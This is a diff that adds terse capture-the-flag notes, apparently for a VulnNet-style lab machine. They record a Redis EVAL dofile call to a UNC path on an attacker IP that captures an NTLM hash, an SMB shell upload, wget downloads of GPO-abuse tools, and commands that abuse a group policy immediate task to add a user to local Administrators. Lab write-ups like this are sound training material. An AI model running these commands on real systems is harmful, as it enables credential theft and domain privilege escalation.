@@ -1,0 +1,31 @@
+we got the redis port and we can get the hash from it
+
+```
+EVAL "dofile('//10.9.19.77/noraj')" 0
+on reponser we had ntlm
+```
+
+we logged on smb and we can upload shell
+
+we got user.txt
+
+now all exploit failed and blood hound said for GPO abuse
+
+```
+put PowerView.ps1
+#Get-DomainGPO
+#Get-DomainGPO -UserIdentity enterprise-security
+
+ wget https://raw.githubusercontent.com/rootSySdk/PowerGPOAbuse/master/PowerGPOAbuse.ps1
+
+#Add-GPOImmediateTask -TaskName 'noraj' -Command 'powershell.exe /c' -CommandArguments 'net localgroup Administrators enterprise-security /add' -Author vulnnet\administrator -GPOIdentity 'security-pol-vn' -Scope Computer
+#gpupdate /force
+
+
+$ wget https://github.com/byronkg/SharpGPOAbuse/raw/main/SharpGPOAbuse-master/SharpGPOAbuse.exe
+
+#.\SharpGPOAbuse.exe --AddComputerTask --TaskName 'noraj' --Author 'vulnnet\administrator' --Command "powershell.exe /c" --Arguments "net localgroup administrators enterprise-security /add" --GPOName "security-pol-vn"
+#gpupdate /force
+```
+
+now we access admin smb and get flag
